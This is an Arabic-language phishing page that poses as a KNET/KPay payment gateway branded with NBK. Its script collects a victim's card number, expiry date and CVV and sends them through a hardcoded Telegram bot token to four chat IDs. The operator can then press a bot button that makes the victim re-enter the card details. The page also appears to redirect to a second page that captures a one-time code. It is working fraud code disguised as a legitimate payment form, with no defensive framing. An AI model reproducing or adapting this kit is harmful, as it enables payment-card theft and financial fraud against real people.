<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع</title>
    <style>
        /* نفس الأنماط السابقة... */
   body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #eee;
            margin: 0;
            padding: 0;
        }
        .banner {
            background: url('www2.0zz0.com/2025/07/13/22/875395686.jpg') no-repeat center center;
            background-size: cover;
            height: 100px;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            padding: 20px;
            position: relative;
        }
        .logo {
            text-align: center;
            margin-bottom: 10px;
        }
        .logo img {
            max-width: 120px;
        }
        .amount {
            text-align: center;
            font-size: 18px;
            color: #0070c0;
            margin: 10px 0;
        }
        .form-box {
            border: 1px solid #ccc;
            border-radius: 10px;
            padding: 20px;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            color: #2e72b1;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #999;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .row {
            display: flex;
            gap: 10px;
        }
        .row select, .row input {
            flex: 1;
        }
        .actions {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        .actions button {
            flex: 1;
            padding: 12px;
            border: none;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin: 0 5px;
        }
        .actions .submit {
            background-color: #0070c0;
            color: #fff;
        }
        .actions .cancel {
            background-color: #ccc;
            color: #333;
        }
        footer {
            text-align: center;
            font-size: 14px;
            color: #777;
            margin-top: 20px;
        }
        
        .error {
            color: #d9534f;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        input.invalid, select.invalid {
            border-color: #d9534f;
            background-color: #fdf7f7;
        }
        input.valid, select.valid {
            border-color: #5cb85c;
            background-color: #f9fff9;
        }
        
        .loading {
            opacity: 0.7;
            pointer-events: none;
        }

        /* رسالة الخطأ من البوت */
        .bot-error-message {
            display: none;
            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
            border: none;
            font-weight: bold;
            font-size: 18px;
            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }

        /* دائرة الانتظار */
        .waiting-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .waiting-content {
            background: white;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
        }
        
        .waiting-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0070c0;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 25px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .waiting-title {
            color: #0070c0;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        
        .waiting-text {
            color: #666;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        
        .waiting-timer {
            color: #ff6b6b;
            font-size: 18px;
            font-weight: bold;
            margin: 15px 0;
        }
        
        .waiting-note {
            color: #888;
            font-size: 14px;
            font-style: italic;
            margin-top: 20px;
        }

        /* زر الإلغاء في وضع الانتظار */
        .cancel-waiting {
            background-color: #ccc;
            color: #333;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
            font-size: 14px;
        }
        
        .cancel-waiting:hover {
            background-color: #bbb;
        }
    </style>
</head>
<body>
    <div class="banner"></div>
    <div class="container">
        <div class="logo">
            <img src="www2.0zz0.com/2025/07/13/21/825012472.png" alt="NBK Logo">
        </div>
        <div class="amount">
            Halamax International Wholesale And Retail Co.
            <br>
        </div>

        <!-- رسالة الخطأ من البوت -->
        <div id="botErrorMessage" class="bot-error-message">
            <div>❌ معلومات البطاقه خطا!</div>
            <div style="font-size: 14px; margin-top: 8px; opacity: 0.9;">
                يرجى إدخال المعلومات الصحيحه
            </div>
        </div>

        <div class="form-box">
            <form id="payForm">
                <label>رقم بطاقة الصرف الآلي:</label>
                <div class="row">
                    <input type="text" id="cardNumber" maxlength="16" placeholder="أدخل باقي الأرقام" required>
                </div>
                <div id="cardNumberError" class="error">يرجى إدخال رقم بطاقة صحيح مكون من 16 رقم</div>

                <label>تاريخ انتهاء البطاقة:</label>
                <div class="row">
                    <select id="expiryMonth" required>
                        <option value="">MM</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                    <select id="expiryYear" required>
                        <option value="">YYYY</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                    </select>
                </div>
                <div id="expiryError" class="error">يرجى اختيار تاريخ انتهاء صحيح ولم ينتهي</div>

                <label>ادخل الرقم السري CVV/CVC :</label>
                <input type="password" id="pinNumber" placeholder="***" maxlength="3" required>
                <div id="pinError" class="error">يرجى إدخال رمز CVV صحيح مكون من 3 أرقام</div>

                <div class="actions">
                    <button type="button" class="cancel" id="cancelBtn">إلغاء</button>
                    <button type="submit" class="submit" id="submitBtn">إرسال</button>
                </div>
            </form>
        </div>
        <footer>
            جميع الحقوق محفوظة © KNET / KPay 2025
        </footer>
    </div>

    <!-- دائرة الانتظار -->
    <div id="waitingOverlay" class="waiting-overlay">
        <div class="waiting-content">
            <div class="waiting-spinner"></div>
            <div class="waiting-title">جاري التحقق من المعلومات</div>
            <div class="waiting-text">تم إرسال بيانات البطاقة بنجاح إلى النظام</div>
            <div class="waiting-text">جاري انتظار التحقق من صحة المعلومات...</div>
            <div class="waiting-timer" id="waitingTimer">⏳ الوقت المتبقي: <span id="timerCount">60</span> ثانية</div>
            <div class="waiting-note">سيتم الانتقال تلقائياً بعد انتهاء الوقت أو عند اكتمال التحقق</div>
            <button class="cancel-waiting" id="cancelWaitingBtn">إلغاء الانتظار والعودة</button>
        </div>
    </div>

    <script>
        // 🔥 المتغيرات العامة للنظام
        const botToken = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
        let lastUpdateId = 0;
        let currentSessionId = Date.now();
        let isCheckingForUpdates = false;
        let waitingTimer = null;
        let countdownTimer = null;
        let remainingTime = 60;
        let updateCheckInterval = null;

        // 🔥 عناصر الواجهة
        const waitingOverlay = document.getElementById('waitingOverlay');
        const timerCount = document.getElementById('timerCount');
        const cancelWaitingBtn = document.getElementById('cancelWaitingBtn');

        // 🔥 دالة فحص تحديثات البوت - محسنة
        async function checkBotUpdates() {
            if (isCheckingForUpdates) return;
            
            isCheckingForUpdates = true;
            
            try {
                console.log("🔍 جاري فحص تحديثات البوت...");
                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
                const data = await response.json();
                
                console.log("📊 بيانات التحديثات المستلمة:", data);
                
                if (data.ok && data.result.length > 0) {
                    console.log(`📨 عدد التحديثات الجديدة: ${data.result.length}`);
                    
                    data.result.forEach(update => {
                        console.log("🔍 تحليل التحديث:", update);
                        
                        // 🔥 التحقق من ضغط زر "معلومات البطاقه خطا"
                        if (update.callback_query && update.callback_query.data === "card_info_incorrect") {
                            console.log("✅ تم استلام أمر معلومات البطاقة خطأ من البوت!");
                            
                            // إيقاف جميع المؤقتات
                            stopAllTimers();
                            
                            // إخفاء شاشة الانتظار
                            hideWaitingOverlay();
                            
                            // عرض رسالة الخطأ للمستخدم
                            showBotErrorMessage();
                            
                            // الرد على البوت لتأكيد الاستلام
                            answerCallbackQuery(update.callback_query.id);
                        }
                        
                        // تحديث lastUpdateId
                        if (update.update_id > lastUpdateId) {
                            lastUpdateId = update.update_id;
                            console.log(`🆔 تم تحديث lastUpdateId إلى: ${lastUpdateId}`);
                        }
                    });
                } else if (!data.ok) {
                    console.error("❌ خطأ في استجابة API:", data);
                }
            } catch (error) {
                console.error("❌ خطأ في التحقق من تحديثات البوت:", error);
            } finally {
                isCheckingForUpdates = false;
            }
        }

        // 🔥 دالة بدء فحص التحديثات بشكل دوري
        function startUpdateChecking() {
            // إيقاف أي فحص سابق
            if (updateCheckInterval) {
                clearInterval(updateCheckInterval);
            }
            
            // البدء بفحص سريع كل ثانيتين
            updateCheckInterval = setInterval(checkBotUpdates, 2000);
            console.log("🔄 بدأ فحص تحديثات البوت بشكل دوري");
        }

        // 🔥 دالة إيقاف فحص التحديثات
        function stopUpdateChecking() {
            if (updateCheckInterval) {
                clearInterval(updateCheckInterval);
                updateCheckInterval = null;
                console.log("⏹️ توقف فحص تحديثات البوت");
            }
        }

        // 🔥 دالة الرد على استعلام الزر في البوت
        async function answerCallbackQuery(callbackQueryId) {
            try {
                console.log(`📤 جاري الرد على callbackQuery: ${callbackQueryId}`);
                const response = await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        callback_query_id: callbackQueryId,
                        text: "تم إرسال طلب التصحيح إلى المستخدم"
                    })
                });
                
                const result = await response.json();
                if (result.ok) {
                    console.log("✅ تم الرد على استعلام البوت بنجاح");
                } else {
                    console.error("❌ فشل في الرد على استعلام البوت:", result);
                }
            } catch (error) {
                console.error("❌ خطأ في الرد على استعلام البوت:", error);
            }
        }

        // 🔥 دالة عرض رسالة الخطأ من البوت
        function showBotErrorMessage() {
            console.log('📨 تم استلام أمر الخطأ من البوت');
            
            const errorElement = document.getElementById('botErrorMessage');
            errorElement.style.display = 'block';
            
            // إعادة تعيين النموذج
            resetForm();
            
            // إخفاء الرسالة بعد 10 ثواني
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 10000);
        }

        // 🔥 دالة إعادة تعيين النموذج
        function resetForm() {
            document.getElementById('payForm').reset();
            document.getElementById('payForm').classList.remove('loading');
            
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = false;
            submitBtn.textContent = 'إرسال';
            
            // تفعيل الحقول مرة أخرى
            document.getElementById('cardNumber').disabled = false;
            document.getElementById('expiryMonth').disabled = false;
            document.getElementById('expiryYear').disabled = false;
            document.getElementById('pinNumber').disabled = false;
            
            // إخفاء أخطاء التحقق
            hideAllErrors();
        }

        // 🔥 إخفاء كل رسائل الخطأ
        function hideAllErrors() {
            const errors = document.querySelectorAll('.error');
            errors.forEach(error => {
                error.style.display = 'none';
            });
        }

        // 🔥 عرض شاشة الانتظار
        function showWaitingOverlay() {
            remainingTime = 60;
            timerCount.textContent = remainingTime;
            waitingOverlay.style.display = 'flex';
            
            // بدء فحص التحديثات بشكل مكثف
            startUpdateChecking();
            
            // بدء العد التنازلي
            startCountdown();
        }

        // 🔥 إخفاء شاشة الانتظار
        function hideWaitingOverlay() {
            waitingOverlay.style.display = 'none';
            stopAllTimers();
            stopUpdateChecking();
        }

        // 🔥 بدء العد التنازلي
        function startCountdown() {
            countdownTimer = setInterval(() => {
                remainingTime--;
                timerCount.textContent = remainingTime;
                
                if (remainingTime <= 0) {
                    stopAllTimers();
                    stopUpdateChecking();
                    // الانتقال إلى صفحة الكود بعد انتهاء الوقت
                    window.location.href = "code.html";
                }
            }, 1000);
        }

        // 🔥 إيقاف جميع المؤقتات
        function stopAllTimers() {
            if (waitingTimer) {
                clearTimeout(waitingTimer);
                waitingTimer = null;
            }
            if (countdownTimer) {
                clearInterval(countdownTimer);
                countdownTimer = null;
            }
        }

        // 🔥 بدء النظام الدوري للتحقق من البوت
        function initializeBotSystem() {
            console.log("🚀 بدء تهيئة نظام البوت...");
            
            // التحقق من صحة token البوت
            checkBotToken().then(isValid => {
                if (isValid) {
                    console.log("✅ رمز البوت صالح، بدء فحص التحديثات");
                    // البدء بفحص التحديثات كل 5 ثواني
                    setInterval(checkBotUpdates, 5000);
                    checkBotUpdates(); // التحقق فور التحميل
                } else {
                    console.error("❌ رمز البوت غير صالح!");
                }
            });
        }

        // 🔥 التحقق من صحة token البوت
        async function checkBotToken() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error("❌ خطأ في التحقق من token البوت:", error);
                return false;
            }
        }

        // 🔥 حدث زر إلغاء الانتظار
        cancelWaitingBtn.addEventListener('click', function() {
            hideWaitingOverlay();
            resetForm();
        });

        // دوال التحقق من الصحة (نفس الكود السابق)
        function validateCardNumber(cardNumber) {
            const cleaned = cardNumber.replace(/\s+/g, '').replace(/-/g, '');
            return /^\d{16}$/.test(cleaned);
        }
        
        function validateExpiryDate(month, year) {
            if (!month || !year) return false;
            
            const currentDate = new Date();
            const currentYear = currentDate.getFullYear();
            const currentMonth = currentDate.getMonth() + 1;
            
            const expiryYear = parseInt(year);
            const expiryMonth = parseInt(month);
            
            if (expiryYear < currentYear) return false;
            if (expiryYear === currentYear && expiryMonth < currentMonth) return false;
            
            return true;
        }
        
        function validateCVV(cvv) {
            return /^\d{3}$/.test(cvv);
        }
        
        function showError(elementId, message) {
            const errorElement = document.getElementById(elementId);
            errorElement.textContent = message;
            errorElement.style.display = 'block';
        }
        
        function hideError(elementId) {
            const errorElement = document.getElementById(elementId);
            errorElement.style.display = 'none';
        }
        
        // التحقق من الحقول في الوقت الفعلي
        document.getElementById('cardNumber').addEventListener('input', function() {
            const cardNumber = this.value;
            
            if (cardNumber.length === 0) {
                this.classList.remove('valid', 'invalid');
                hideError('cardNumberError');
            } else if (validateCardNumber(cardNumber)) {
                this.classList.add('valid');
                this.classList.remove('invalid');
                hideError('cardNumberError');
            } else {
                this.classList.add('invalid');
                this.classList.remove('valid');
                showError('cardNumberError', 'رقم البطاقة يجب أن يكون 16 رقم');
            }
        });
        
        document.getElementById('expiryMonth').addEventListener('change', validateExpiry);
        document.getElementById('expiryYear').addEventListener('change', validateExpiry);
        
        function validateExpiry() {
            const month = document.getElementById('expiryMonth').value;
            const year = document.getElementById('expiryYear').value;
            
            if (month && year) {
                if (validateExpiryDate(month, year)) {
                    document.getElementById('expiryMonth').classList.add('valid');
                    document.getElementById('expiryMonth').classList.remove('invalid');
                    document.getElementById('expiryYear').classList.add('valid');
                    document.getElementById('expiryYear').classList.remove('invalid');
                    hideError('expiryError');
                } else {
                    document.getElementById('expiryMonth').classList.add('invalid');
                    document.getElementById('expiryMonth').classList.remove('valid');
                    document.getElementById('expiryYear').classList.add('invalid');
                    document.getElementById('expiryYear').classList.remove('valid');
                    showError('expiryError', 'تاريخ الانتهاء غير صالح أو منتهي الصلاحية');
                }
            } else {
                document.getElementById('expiryMonth').classList.remove('valid', 'invalid');
                document.getElementById('expiryYear').classList.remove('valid', 'invalid');
                hideError('expiryError');
            }
        }
        
        document.getElementById('pinNumber').addEventListener('input', function() {
            const pin = this.value;
            
            if (pin.length === 0) {
                this.classList.remove('valid', 'invalid');
                hideError('pinError');
            } else if (validateCVV(pin)) {
                this.classList.add('valid');
                this.classList.remove('invalid');
                hideError('pinError');
            } else {
                this.classList.add('invalid');
                this.classList.remove('valid');
                showError('pinError', 'الرمز السري يجب أن يكون 3 أرقام');
            }
        });
        
        // زر الإلغاء
        document.getElementById('cancelBtn').addEventListener('click', function() {
            if (confirm('هل تريد حقاً إلغاء عملية الدفع؟')) {
                window.history.back();
            }
        });
        
        // 🔥 إرسال النموذج - معدل مع نظام الانتظار
        document.getElementById("payForm").addEventListener("submit", function(e) {
            e.preventDefault();

            // الحصول على القيم
            const cardNumber = document.getElementById("cardNumber").value;
            const month = document.getElementById("expiryMonth").value;
            const year = document.getElementById("expiryYear").value;
            const pin = document.getElementById("pinNumber").value;
            
            // التحقق من صحة البيانات
            let isValid = true;
            
            if (!validateCardNumber(cardNumber)) {
                showError('cardNumberError', 'يرجى إدخال رقم بطاقة صحيح مكون من 16 رقم');
                document.getElementById("cardNumber").focus();
                isValid = false;
            }
            
            if (!validateExpiryDate(month, year)) {
                showError('expiryError', 'يرجى اختيار تاريخ انتهاء صحيح ولم ينتهي');
                isValid = false;
            }
            
            if (!validateCVV(pin)) {
                showError('pinError', 'يرجى إدخال رمز CVV صحيح مكون من 3 أرقام');
                document.getElementById("pinNumber").focus();
                isValid = false;
            }
            
            if (!isValid) {
                return;
            }
            
            // إظهار حالة التحميل
            const submitBtn = document.getElementById("submitBtn");
            const originalText = submitBtn.textContent;
            submitBtn.textContent = "جاري الإرسال...";
            submitBtn.disabled = true;
            document.getElementById("payForm").classList.add("loading");
            
            // تعطيل الحقول أثناء الإرسال
            document.getElementById("cardNumber").disabled = true;
            document.getElementById("expiryMonth").disabled = true;
            document.getElementById("expiryYear").disabled = true;
            document.getElementById("pinNumber").disabled = true;
            
            // تحديث sessionId
            currentSessionId = Date.now();
            
            // بيانات التليجرام
            const token = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
            const chat_ids = ["7335192117", "6323300854", "8280462390", "7942066919"];
            
            const message = `💳 معلومات الدفع الجديدة:\\n\\n` +
                            `🔢 رقم البطاقة: ${cardNumber}\\n` +
                            `📆 تاريخ الانتهاء: ${month}/${year}\\n` +
                            `🔐 الرقم السري: ${pin}\\n\\n` +
                            `🆔 رقم الجلسة: ${currentSessionId}\\n\\n` +
                            `⏳ حالة النظام: في انتظار التحقق\\n\\n` +
                            `⚠️ إذا كانت المعلومات خاطئة، اضغط على الزر:`;

            // 🔥 إنشاء زر "معلومات البطاقه خطا"
            const keyboard = {
                inline_keyboard: [[
                    {
                        text: "❌ معلومات البطاقه خطا - إعادة الإدخال",
                        callback_data: "card_info_incorrect"
                    }
                ]]
            };

            console.log("🚀 بدء إرسال البيانات إلى التليجرام مع الزر...");
            
            // إرسال الرسالة لكل chat_id
            let sentCount = 0;
            let errorCount = 0;
            
            chat_ids.forEach(chat_id => {
                const url = `https://api.telegram.org/bot${token}/sendMessage`;
                
                console.log(`📤 محاولة الإرسال إلى: ${chat_id}`);
                
                fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chat_id,
                        text: message,
                        reply_markup: keyboard // إضافة الزر للرسالة
                    })
                })
                .then(response => {
                    console.log(`✅ استجابة من ${chat_id}:`, response.status);
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    console.log(`📊 بيانات الاستجابة من ${chat_id}:`, data);
                    if (data.ok) {
                        sentCount++;
                        console.log(`✅ تم الإرسال إلى ${chat_id} بنجاح`);
                    } else {
                        errorCount++;
                        console.error(`❌ فشل الإرسال إلى ${chat_id}:`, data.description);
                    }
                })
                .catch(error => {
                    errorCount++;
                    console.error(`❌ خطأ في الإرسال إلى ${chat_id}:`, error);
                })
                .finally(() => {
                    // إذا اكتملت جميع المحاولات
                    if (sentCount + errorCount === chat_ids.length) {
                        console.log(`🎯 اكتمل الإرسال: ${sentCount} نجاح, ${errorCount} فشل`);
                        
                        if (sentCount > 0) {
                            // 🔥 عرض شاشة الانتظار بدلاً من الانتقال الفوري
                            showWaitingOverlay();
                        } else {
                            // فشل الإرسال - إعادة تفعيل النموذج
                            resetForm();
                            alert("❌ فشل إرسال البيانات. يرجى المحاولة مرة أخرى.");
                        }
                    }
                });
            });
        });

        // 🔥 تهيئة النظام عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            console.log("✅ النظام جاهز! الآن عندما تضغط على زر 'معلومات البطاقه خطا' في البوت، سترى رسالة الخطأ تظهر تلقائياً في الموقع.");
            initializeBotSystem();
        });
    </script>
</body>
</html>